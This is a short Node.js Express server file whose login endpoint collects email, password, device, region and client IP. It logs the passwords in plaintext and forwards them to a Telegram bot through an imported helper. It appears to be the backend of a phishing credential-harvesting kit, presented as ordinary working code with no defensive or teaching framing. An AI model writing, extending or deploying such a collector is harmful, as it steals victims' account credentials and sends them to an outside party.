// server.js
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const { sendTelegramMessage } = require('./bot.js'); // import the function
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

app.post('/', async (req, res) => {
  try {
    const { email, password, device, region } = req.body;
    console.log('Login attempt:', { email, password, device, region });

    // Get client IP from request
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    // Send Telegram message
    await sendTelegramMessage(email, password, region, device, ip);

    // TODO: Here you can implement approval logic
    const status = password === 'test123' ? 'accept' : 'reject';
    res.json({ status });
  } catch (err) {
    console.error('Error handling login:', err);
    res.status(500).json({ status: 'error', message: 'Internal server error' });
  }
});

app.get('/', (req, res) => {
  res.send('Server is running');
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
